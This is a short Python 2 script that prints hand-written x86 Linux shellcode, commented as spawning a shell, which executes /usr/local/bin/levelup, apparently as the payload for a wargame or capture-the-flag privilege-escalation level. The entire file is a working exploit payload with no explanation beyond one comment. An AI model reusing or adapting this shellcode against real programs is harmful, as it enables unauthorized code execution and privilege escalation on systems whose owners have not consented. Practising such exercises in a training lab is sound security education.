#!/usr/bin/env python2

# This machine code will spawn a shell on this machine if run on the CPU
shellcode =  b'\xeb\x16\x5b\x31\xc0\x88\x43\x16\x89\x5b\x17\x89\x43'
shellcode += b'\x1b\xb0\x0b\x8d\x4b\x17\x8d\x53\x1b\xcd\x80\xe8\xe5'
shellcode += b'\xff\xff\xff/usr/local/bin/levelupXAAAABBBB'

print shellcode
